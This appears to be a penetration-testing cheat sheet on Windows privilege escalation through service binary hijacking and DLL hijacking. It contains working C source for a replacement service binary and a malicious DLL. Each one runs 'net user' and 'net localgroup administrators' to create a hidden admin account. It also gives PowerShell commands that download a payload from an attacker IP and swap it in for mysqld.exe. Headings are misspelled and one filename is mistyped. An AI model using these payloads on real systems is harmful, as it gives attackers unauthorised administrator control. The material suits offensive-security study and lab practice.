# Pervlige Escalation In short


## Add user to the system via Leavrginy mysql service | Service Binary Hijacking. 
### Breif
Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state.

For this section, let's consider a scenario in which a software developer creates a program and installs an application as a Windows service. During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group. As a result, a lower-privileged user could replace the program with a malicious one. 

To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine. Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as LocalSystem.

We begin by connecting to The Victim as user over RDP. To use powershell commands, Get-Ciminstances, Get-Services.. etc. 

To get a list of all installed Windows services, we can choose various methods such as the GUI snap-in services.msc, the Get-Service Cmdlet, or the Get-CimInstance Cmdlet (superseding Get-WmiObject).
### Indicator:
![image](https://github.com/MalekAlthubiany/Scripts_Windows/assets/127455300/6ce3ca29-2b07-48a9-a59e-e4df5648a6c5)
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
## Simply replace the service
```
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exx
```

## Add user to the system via Leavrging service (Misconifugation) | Service DLL Hijacking. 
### Breif
Replacing the binary of a service is a very effective way to attempt privilege escalation on Windows systems. However, because our user doesn't often have permissions to replace these binaries, we'll need to adapt with a more advanced way of abusing Windows services.

Dynamic Link Libraries (DLL)1 provide functionality to programs or the Windows operating system. DLLs contain code or resources, such as icon files, for other executable files or objects to use. These libraries provide a way for developers to use and integrate already existing functionality without reinventing the wheel. Windows uses DLLs to store functionality needed by several components. Otherwise, each component would need the functionality in their own source code resulting in a huge resource waste. On Unix systems, these files are called Shared Objects.2

There are several methods we can use to exploit how DLLs work on Windows and they can often be an effective way of elevating our privileges. One method is similar to the privilege escalation vector performed in the previous section. Instead of overwriting the binary, we merely overwrite a DLL the service binary uses. However, the service may not work as expected because the actual DLL functionality is missing. In most cases, this would still lead us to code execution of the DLL's code and then, for example, to the creation of a new local administrative user.

Another method is to hijack the DLL search order.3 The search order is defined by Microsoft and determines what to inspect first when searching for DLLs. By default, all current Windows versions have safe DLL search mode enabled.

This setting was implemented by Microsoft due to the high number of DLL hijacking vectors and ensures that DLLs are more difficult to hijack. The following listing shows the standard search order taken from the Microsoft Documentation:3

### Indicator:
![image](https://github.com/MalekAlthubiany/Scripts_Windows/assets/127455300/13f9db2c-e01e-442e-be3c-aa91e5472a9f)

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

